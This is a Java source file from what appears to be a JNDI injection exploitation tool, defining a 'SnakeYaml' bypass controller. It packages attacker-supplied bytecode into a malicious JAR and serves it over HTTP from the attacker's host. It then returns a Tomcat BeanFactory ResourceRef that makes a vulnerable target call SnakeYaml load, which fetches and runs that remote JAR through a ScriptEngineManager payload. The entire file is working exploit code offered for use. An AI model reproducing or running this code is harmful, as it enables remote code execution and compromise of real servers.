package cn.butler.jndi.controller.bypass;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.controller.BasicController;
import cn.butler.jndi.server.WebServer;
import cn.butler.payloads.ObjectPayload;
import cn.butler.thirdparty.payloads.JarHandle.JarPayload;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        //远程加载jar包部署
        String className = null;
        byte[] jarBytes = null;
        try {
            className = ClassHandleUtil.getClassNameByByteCode(byteCode);
            jarBytes = JarPayload.createWithSPI(className, byteCode);
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
        String snakeYamlargs = "http://" + JndiConfig.ip + ":" + JndiConfig.httpPort + "/" + className + ".jar";
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);

        //org.apache.naming.factory.BeanFactory集成YamlPayload
        String yaml = (String)ObjectPayload.Utils.makePayloadObject("SnakeYamlAttack","ScriptEngineManager",snakeYamlargs);
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
